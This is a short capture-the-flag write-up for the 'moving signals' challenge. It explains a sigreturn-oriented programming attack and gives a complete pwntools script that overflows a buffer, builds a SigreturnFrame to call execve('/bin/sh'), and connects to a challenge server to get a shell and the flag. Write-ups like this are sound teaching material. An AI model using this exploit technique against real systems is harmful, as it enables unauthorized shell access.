## 0x41414141 CTF: moving signals
> desc to be added later

##### *tl;dr: signal return oriented programming*
#### Details later. We have a buffer overflow but only little gadgets to work with (only to set rax, rdi but nothing to set rdx rsi etc.). We have a /bin/sh string on the binary and with the challenge title serving as a hint, I prepared a sigrop exploit.

```python
from pwn import *

#: CONNECT TO CHALLENGE SERVERS
binary = ELF('./moving-signals', checksec = False)
#: libc = ELF('./libc', checksec = False)
#p = process('./moving-signals')
#: p = process('./moving-signals', env = {'LD_PRELOAD' : './libc.so'})
p = remote("185.172.165.118", 2525)

#: GDB SETTINGS
breakpoints = ['break *0x41015']
#gdb.attach(p, gdbscript = '\n'.join(breakpoints))

#: EXPLOIT INTERACTION FUNCTIONS
pop_rax = 0x0000000000041018
ret = 0x0000000000041017
syscall = 0x0000000000041015

#: PWN THY VULNS
context.arch = 'amd64'
exploit = cyclic(8)
exploit += p64(ret)
exploit += p64(pop_rax)
exploit += p64(0xf)
exploit += p64(syscall)

#:
frame = SigreturnFrame(kernel = "amd64")
frame.rax = 59 #: execve syscall
frame.rdi = 0x41250 #: /bin/sh string in memory
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall #: execve('/bin/sh', 0, 0);

exploit += str(frame)
p.sendline(exploit)

#: Stage 2
p.interactive()
#: flag{s1gROPp1ty_r0p_321321}
```